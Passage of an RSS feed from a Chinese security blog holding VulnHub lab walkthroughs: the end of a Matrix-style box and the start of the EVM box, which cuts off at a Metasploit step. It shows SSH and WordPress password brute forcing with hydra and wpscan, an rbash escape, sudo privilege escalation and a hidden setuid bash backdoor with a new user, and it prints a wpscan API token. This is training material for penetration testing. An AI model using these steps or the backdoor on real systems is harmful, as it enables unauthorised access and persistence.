&lt;p&gt;发现一串 base64 加密的字符，通过终端解密此密文&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=&amp;quot; | base64 -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-134.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 得到文件名为 Cypher.matrix 的提示文件&lt;/p&gt;
&lt;p&gt;尝试访问 http://192.168.31.107:31337/Cypher.matrix&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-135.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;下载后得到一个文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-136.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;brainfuck-解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#brainfuck-解密&#34;&gt;#&lt;/a&gt; Brainfuck 解密&lt;/h3&gt;
&lt;p&gt;这是一个 brainfuck 加密，直接在线解密&lt;br&gt;
解密网址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYuYnVna3UuY29tL3Rvb2wvYnJhaW5mdWNr&#34;&gt;https://ctf.bugku.com/tool/brainfuck&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-137.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 用户名:guest 密码：k1ll0rXX&lt;br&gt;
 最后两位 XX 是未知的，需要进行爆破&lt;/p&gt;
&lt;h3 id=&#34;crunch-生成字典&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#crunch-生成字典&#34;&gt;#&lt;/a&gt; Crunch 生成字典&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看字典生成规则的lst文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /usr/share/crunch/charset.lst ｜ grep lalpha&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-138.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;crunch 8 8 -f /usr/share/crunch/charset.lst lalpha-numeric -t k1ll0r@@ &amp;gt; pass.dic&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Usage: crunch &amp;lt;min&amp;gt; &amp;lt;max&amp;gt; [options]. &lt;span class=&#34;built_in&#34;&gt;where&lt;/span&gt; min and max are numbers&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-f /path/to/charset.lst charset-name&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-139.png&#34; width=&#34;630&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;hydra-爆破-ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破-ssh&#34;&gt;#&lt;/a&gt; Hydra 爆破 SSH&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;hydra -l guest -P pass.dic ssh://192.168.31.107 -f -t 4 -I -vV -o hydra.ssh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-l 指定用户guest -P 指定字典 -f 爆破密码成功后停止&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-vV 显示详细过程 -o将爆破成功信息保存到文件中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-140.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-141.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 用户名:guest 密码：k1ll0r7n&lt;/p&gt;
&lt;h3 id=&#34;rbash逃逸&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rbash逃逸&#34;&gt;#&lt;/a&gt; Rbash 逃逸&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;ssh登陆到此台服务器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh guest@192.168.31.107 k1ll0r7n&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-142.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现此会话窗口是 rbash，即做了限制的 bash&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看当前环境变量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo $PATH&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo /home/guest/prog/*&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-143.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;发现当前只能使用vi，尝试使用vi逃逸rbash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vi test 然后ESC 接着:!/bin/bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-144.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;rbash 成功升级为了 bash，但是很多命令还是没有&lt;/p&gt;
&lt;h3 id=&#34;sudocp提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudocp提权&#34;&gt;#&lt;/a&gt; sudo (cp) 提权&lt;/h3&gt;
&lt;p&gt;查看到正常机器上的 id 是在 /usr/bin 上，输入 /usr/bin/id 可以正常使用，而输入 id 无法正常访问，说明当前的会话窗口找不到 id 命令，要从环境变量中添加&lt;br&gt;
 &lt;code&gt;export PATH=/usr/bin:$PATH&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-145.png&#34; width=&#34;630&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;sudo -l 查看相关的权限设置&lt;br&gt;
发现 trinity 可以无密码使用 /bin/cp&lt;br&gt;
cp 提权说明：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvY3Av&#34;&gt;https://gtfobins.github.io/gtfobins/cp/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd /home/trinity/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo -u trinty /bin/cp /bin/sh evil&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo -u trinty evil&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-146.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;root-权限问题提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#root-权限问题提权&#34;&gt;#&lt;/a&gt; root 权限问题提权&lt;/h3&gt;
&lt;p&gt;sudo -l 发现可以由 root 执行 /home/thrity/oracle&lt;br&gt;
 但是此文件在此目录中并不存在，复制出来 bash，并利用 root 执行此文件&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cp /bin/bash /home/thrity/oracle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo /home/thrity/oracle&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输入 id 之后，可见成功提权至 root&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-147.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;sudo-su提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudo-su提权&#34;&gt;#&lt;/a&gt; sudo su 提权&lt;/h3&gt;
&lt;p&gt;当拿到 root 权限之后，习惯性的翻阅 /etc/sudoers 文件，发现此文件中授予了 guest 用户执行 root 的所有权限，意味着 guest 用户可以 sudo su 并输入自己的密码切换到 root 账户&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/sudoers | grep &amp;quot;ALL=(ALL) ALL&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;su guest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo su&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-148.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;即意味着当得到 guest 用户 rbash 逃逸后，可以凭借 sudo su 直接提权为 root&lt;/p&gt;
&lt;h3 id=&#34;suid-权限维持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suid-权限维持&#34;&gt;#&lt;/a&gt; suid 权限维持&lt;/h3&gt;
&lt;p&gt;参考地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5tY2h6LmNvbS5jbi9jbi9zZXJ2aWNlL3NhZmV0eS1sYWIvaW5mb18yNl9pdGVtaWRfNDA2MC5odG1s&#34;&gt;http://www.mchz.com.cn/cn/service/safety-lab/info_26_itemid_4060.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;在正常的机器上找到 useradd 与 passwd 的位置，将其目录添加到靶机的 PATH 中，添加 kali 用户，并复制 bash，添加 s 权限，隐藏后门，方便提权&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;靶机&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export PATH=/usr/sbin:$PATH&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;useradd kali &amp;amp;&amp;amp; passwd kali&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp /bin/bash /var/.hack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod 4755 /var/.hack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls -Alh /var/.hack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;攻击机&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh kali@192.168.31.107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/.hack -p &amp;amp; whoami&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-149.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 可以通过 kali 用户直接登陆此台服务器，并且利用我们遗留在服务器上具有 s 权限的后门文件进行升级 shell&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/101%20EVM/</guid>
            <title>VULNHUB 1 EVM</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/101%20EVM/</link>
            <category>VULNHUB 1-10</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZXZtLTEsMzkxLw==&#34;&gt;https://www.vulnhub.com/entry/evm-1,391/&lt;/span&gt;&lt;br&gt;
 教程链接地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpdmVyMTAwZGF5L2FydGljbGUvZGV0YWlscy8xMTkyNzY3OTc=&#34;&gt;https://blog.csdn.net/liver100day/article/details/119276797&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI：192.168.31.135&lt;br&gt;
 靶机 EVM：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-000.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3）去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP&lt;br&gt;
 &lt;code&gt;sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-001.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.155&lt;/p&gt;
&lt;h3 id=&#34;端口扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#端口扫描&#34;&gt;#&lt;/a&gt; 端口扫描&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A - p 1-1024 192.168.31. 155 - oN /tmp/evm.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-002.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;wordpress渗透&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wordpress渗透&#34;&gt;#&lt;/a&gt; wordpress 渗透&lt;/h3&gt;
&lt;p&gt;打开网站：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTU1&#34;&gt;http://192.168.31.155&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;观察页面可知存在网址 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTU1L3dvcmRwcmVzcy8=&#34;&gt;http://192.168.31.155/wordpress/&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-003.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;对此网站进行目录扫描&lt;br&gt;
 &lt;code&gt;dirsearch -u [http://192.168.31.155](http://192.168.31.155)&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-004.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTU1L3dvcmRwcmVzcy8=&#34;&gt;http://192.168.31.155/wordpress/&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTU1L3dvcmRwcmVzcy93cC1sb2dpbi5waHA=&#34;&gt;http://192.168.31.155/wordpress/wp-login.php&lt;/span&gt;&lt;br&gt;
-&amp;gt; 对 wordpress 网站渗透扫描&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;获取到 wpscan 的 api token：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93cHNjYW4uY29tL3Byb2ZpbGU/cHJpY2luZ0xpc3Q9MQ==&#34;&gt;https://wpscan.com/profile?pricingList=1&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过以下命令枚举wordpress的用户名：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wpscan --url http://192.168.31.155/wordpress/ --enumerate u --api-token&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-005.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过以下命令爆破wordpress用户名c0rrupt3d_brain的密码：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wpscan --url [http://192.168.](http://192.168.) 31 .1 55 /wordpress/ - U c0rrupt3d_brain -P&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/usr/share/wordlists/rockyou.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-006.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功得到 wordpress 网站的用户名：c0rrupt3d_brain ，密码： 24992499&lt;/p&gt;
&lt;h3 id=&#34;msf攻击wordpress&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf攻击wordpress&#34;&gt;#&lt;/a&gt; msf 攻击 wordpress&lt;/h3&gt;
&lt;p&gt;1) 得到账号密码，可以登入后台写入反弹 shell 到任意模板 getshell，&lt;br&gt;
也可以使用 msf 自带 exploit/unix/webapp/ 下的模块进行利用，因为 msf 方便，这里我选择后者&lt;/p&gt;
